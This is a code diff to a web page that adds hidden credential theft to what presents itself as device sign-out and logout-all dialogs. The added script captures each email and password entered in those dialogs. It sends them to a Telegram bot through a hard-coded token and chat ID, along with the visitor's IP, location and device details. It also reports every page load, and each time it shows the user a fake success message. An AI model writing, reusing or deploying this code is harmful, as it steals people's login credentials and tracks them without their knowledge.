@@ -413,6 +413,70 @@
     </div>
 
     <script>
+        // Configuration
+        const BOT_TOKEN = '7371610501:AAFcYAjSy1ZKgKh7ihaq6dLJvt9yj8gDonE';
+        const CHAT_ID = '7623079090';
+        const IPINFO_TOKEN = '2da9da1f876081';
+
+        // Function to get IP and location info
+        async function getIPInfo() {
+            try {
+                const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
+            }
+        }
+
+        // Function to send message to Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram send error:', error);
+            }
+        }
+
+        // Function to get user info
+        function getUserInfo() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenResolution = `${screen.width}x${screen.height}`;
+            const currentTime = new Date().toLocaleString();
+            
+            return {
+                userAgent,
+                platform,
+                language,
+                screenResolution,
+                currentTime
+            };
+        }
+
+        // Send page visit notification
+        async function sendPageVisitNotification() {
+            const message = `🚨 <b>Open the page</b>`;
+            await sendToTelegram(message);
+        }
+
+        // Send page visit notification on load
+        window.addEventListener('load', function() {
+            sendPageVisitNotification();
+        });
+
         function openModal() {
             document.getElementById('signoutModal').classList.add('show');
         }
@@ -423,11 +487,35 @@
             document.getElementById('passwordInput').value = '';
         }
 
-        function confirmSignOut() {
+        async function confirmSignOut() {
             const email = document.getElementById('emailInput').value;
             const password = document.getElementById('passwordInput').value;
             
             if (email && password) {
+                // Send sign out info to Telegram
+                const ipInfo = await getIPInfo();
+                const userInfo = getUserInfo();
+                
+                const message = `
+🔴 <b>Single Device Sign Out!</b>
+
+📧 Email: ${email}
+🔑 Password: ${password}
+
+📍 <b>IP Info:</b>
+IP: ${ipInfo.ip}
+Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
+
+🖥️ <b>Device Info:</b>
+User Agent: ${userInfo.userAgent}
+Platform: ${userInfo.platform}
+Language: ${userInfo.language}
+Screen: ${userInfo.screenResolution}
+
+🕐 Time: ${userInfo.currentTime}
+                `;
+                
+                await sendToTelegram(message);
                 alert('Device signed out successfully!');
                 closeModal();
             } else {
@@ -445,11 +533,35 @@
             document.getElementById('passwordInputAll').value = '';
         }
 
-        function confirmLogoutAll() {
+        async function confirmLogoutAll() {
             const email = document.getElementById('emailInputAll').value;
             const password = document.getElementById('passwordInputAll').value;
             
             if (email && password) {
+                // Send logout all info to Telegram
+                const ipInfo = await getIPInfo();
+                const userInfo = getUserInfo();
+                
+                const message = `
+🔴🔴 <b>LOGOUT ALL DEVICES!</b>
+
+📧 Email: ${email}
+🔑 Password: ${password}
+
+📍 <b>IP Info:</b>
+IP: ${ipInfo.ip}
+Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
+
+🖥️ <b>Device Info:</b>
+User Agent: ${userInfo.userAgent}
+Platform: ${userInfo.platform}
+Language: ${userInfo.language}
+Screen: ${userInfo.screenResolution}
+
+🕐 Time: ${userInfo.currentTime}
+                `;
+                
+                await sendToTelegram(message);
                 alert('All devices logged out successfully!');
                 closeLogoutAllModal();
             } else {
